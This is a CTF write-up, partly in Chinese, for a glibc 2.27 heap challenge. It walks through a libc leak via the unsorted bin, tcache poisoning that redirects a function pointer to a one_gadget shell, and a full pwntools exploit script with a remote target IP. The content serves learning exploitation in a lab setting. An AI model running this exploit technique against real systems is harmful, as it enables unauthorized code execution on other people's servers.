# 1.0 Challenge
1. HOW TO LEAK libc?
2. how to build payload
3. heap where to inject?
4. double free Attack flow ?
# 2.0 Analysis
为什么会做这个 是 from [[PWN -- pwn4 QL -- UAF ORW]] 因为要学 tcache 2.27 的版本 怎样leak?
先从简单开始 so 找到这个
他的用法在 [[TUTORIAL]] 2.0 fastbin_dup 就是 
malloc A B C 
free A B A
malloc A B
可以通过改 出来的 A  做还在 free list `[A]` 一单
再 malloc 出奇迹

基本的function
add: size
edit: index, data
delete: index
show: index
# 3.0 Solution

## 3.1 HOW TO LEAK libc?
然后我神奇找到这个东西 dbg 出来的
under gdb -> bins
< 500 是 tcachebins > 500 是  unsortedbin
```
pwndbg> bins
tcachebins
0x130 [  1]: 0x1bd4260 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty
```

然后进了 unsorted bin 只要show 就会出leak 
2.27 版本 - 0x3ebca0 就是 libc base

## 3.1 how to build payload?
拿到 libc base so ?????
可以用one gadget 
随便选一个 0x4f29e 0x4f2a5 0x4f302 0x10a2fc
```
┌──(kali㉿kali)-[~/Desktop/CTF/wangding/bookmanager]
└─$ one_gadget libc.so.6 
0x4f29e execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
现在的方向是 题目有给 magic_library
就是如果 enter index 17 会 `jmp [magic_library]`
so 我们的任务是 把magic_library 改成 one gadget

## 3.3 double free Attack flow ?

```
* = free status

1.leak base
-----------------------------------------------------------------------------
malloc 0x500 -> unsort bin 0
malloc 0x8 -> tcache 1
malloc 0x8 -> tcache 2
free 0 
show 0 -> calculate libc base

heap list        = [*0, 1, 2]
free list (0x20) = []
unsorted bin     = [0]
-----------------------------------------------------------------------------
2.double free -> target double free 1 == fl [0 1 2 1], out 0 1 2, modify 1 ??
free 1 -> [1 0]
free 2 -> [2 1 0]
如果这个时候再 free 1  就会 df detected in tcache .....

heap list        = [*0, *1, *2]
free list (0x20) = [1, 2] 不知道为什么 bins 记录的是parseheap + 0x10
unsorted bin     = [0] 可忽略
-----------------------------------------------------------------------------
神奇的事情 我发现edit 会enable 回 heap
更神奇的是 改 free 的chunk 会point 回自己 ？？？？？ 
edit 2 p64(exe.sym['magic_library']) -> overwrite fd of chunk 2

这个时候 *2 的 fd 是 magic_library

heap list        = [*0, 1, *2]
free list (0x20) = [2, (fd = magic_library)]
-----------------------------------------------------------------------------
malloc 0x8 -> 3 from 2 

heap list        = [*0, 1, 2]
free list (0x20) = [(fd = magic_library)]
-----------------------------------------------------------------------------
malloc 0x8 -> 4 from magic_library 
为什么没有动到 free list

heap list        = [*0, 1, 2]
free list (0x20) = []
-----------------------------------------------------------------------------
edit 4 one_gadget(libc.path, libc.address)
现在 magic_library = one_gadget

heap list        = [*0, 1, 2]
free list (0x20) = []

magic_library = one_gadget
pwndbg> x/20gx 0x602110
0x602110 <magic_library>:       0x00007f2cdfa4f29e      0x0000000000000000

??? done
-----------------------------------------------------------------------------
```

为什么我改 4 会 变到 magic_library = one_gadget?
因为 malloc 0x8 -> 4 from magic_library 
原本 4 的位置 被 2 改成 magic_library 了
# 4.0 FLAG 
local not in remote
# 5.0 FINAL SCRIPT 
```python
# -*- coding: utf-8 -*-
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
# context.arch='amd64'
context.os = "linux"

pc = "./task_patched"

libc  = ELF('./libc.so.6', checksec=False)
ld = ELF("ld-2.27.so")
exe = context.binary = ELF(pc)



scripts = """
set resolve-heap-via-heuristic force
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)
 

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f').ljust(8, b'\x00')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)


def add(size):
  sla('>> ', '1')
  sla('size:\n', str(size))

def edit(idx,data):
  sla('>> ', '2')
  sla('index:\n', str(idx))
  sa('content:\n', data)

def free(idx):
  sla('>> ', '3')
  sla('index:\n', str(idx))

def show(idx):
  sla('>> ', '4')
  sla('index:\n', str(idx))

#double free
add(0x500) # 0 only > 0x500 can in unsort bin?
add(0x8) # 1 -> in tcache
add(0x8) # 2
free(0) # [0]
show(0)
# dbg()

ru('OUTPUT: ')
leak = u64(ru7f())
# leak = rl()
print("this is leak",hex(leak))
# 2.27 leak 
libc.address = leak - 0x3ebca0
logbase()

free(1) # [1,0]
free(2) # [2,1,0] -> double free on idx 1
logleak("magic_library",exe.sym['magic_library'])


edit(2, p64(exe.sym['magic_library']))
add(0x8) # 3 return 2 [1,0]


add(0x8) # 4 return 1 [0]
onegadgets = one_gadget(libc.path, libc.address)
logleak("one_gadget",onegadgets[1])

edit(4, p64(onegadgets[1]))

dbg()

# sla('>> ', '17')
# 0000000000602110 B magic_library
# 0x0000000000400851 : jmp rax

ti()

```


# 6.0 REFERENCE

https://github.com/nobodyisnobody/write-ups/blob/1027ab1f093d316d1b8170849d82abd0caae32f8/TyphoonCon.CTF.2023/pwn/BookManager/working.exploit.py#L70